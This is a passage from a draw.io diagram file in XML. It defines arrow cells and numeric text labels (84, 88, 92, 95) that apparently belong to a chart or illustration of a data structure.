            <mxPoint x="797" y="410" as="sourcePoint" />
            <mxPoint x="797" y="376.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-108" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="847" y="411" as="sourcePoint" />
            <mxPoint x="847" y="377.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-109" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="898" y="409" as="sourcePoint" />
            <mxPoint x="898" y="375.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-110" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="946" y="409" as="sourcePoint" />
            <mxPoint x="946" y="375.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-111" value="84" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="926" y="401" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-112" value="95" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="973" y="320" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-113" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="992" y="410" as="sourcePoint" />
            <mxPoint x="992" y="376.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-114" value="88" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="972" y="402" width="40" height="30" as="geometry" />
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-115" value="" style="endArrow=classic;html=1;rounded=0;entryX=0.05;entryY=1.067;entryDx=0;entryDy=0;entryPerimeter=0;" edge="1" parent="1">
          <mxGeometry width="50" height="50" relative="1" as="geometry">
            <mxPoint x="1045" y="409" as="sourcePoint" />
            <mxPoint x="1045" y="375.67999999999995" as="targetPoint" />
          </mxGeometry>
        </mxCell>
        <mxCell id="ZPE9J0E1WmX5tTQRSp_o-116" value="92" style="text;html=1;align=center;verticalAlign=middle;resizable=0;points=[];autosize=1;strokeColor=none;fillColor=none;" vertex="1" parent="1">
          <mxGeometry x="1025" y="401" width="40" height="30" as="geometry" />
        </mxCell>
      </root>
    </mxGraphModel>
  </diagram>
</mxfile>
